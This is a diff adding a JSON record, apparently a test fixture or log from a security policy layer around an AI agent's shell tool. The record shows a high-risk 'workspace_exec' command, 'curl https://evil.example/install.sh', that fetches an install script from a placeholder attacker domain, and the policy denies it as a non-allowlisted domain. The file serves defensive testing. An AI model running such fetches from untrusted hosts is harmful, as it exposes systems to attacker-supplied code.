@@ -1,0 +1,26 @@
+{
+  "decision": "deny",
+  "risk_level": "high",
+  "rule_id": "network.non_whitelisted_domain",
+  "evidence": [
+    "domain \"evil.example\" is not in network_allowlist"
+  ],
+  "recommendation": "Use a whitelisted domain or update network_allowlist after review.",
+  "tool_name": "workspace_exec",
+  "command": "curl https://evil.example/install.sh",
+  "backend": "workspaceexec",
+  "blocked": true,
+  "redacted": false,
+  "duration_ms": 0,
+  "findings": [
+    {
+      "decision": "deny",
+      "risk_level": "high",
+      "rule_id": "network.non_whitelisted_domain",
+      "evidence": [
+        "domain \"evil.example\" is not in network_allowlist"
+      ],
+      "recommendation": "Use a whitelisted domain or update network_allowlist after review."
+    }
+  ]
+}
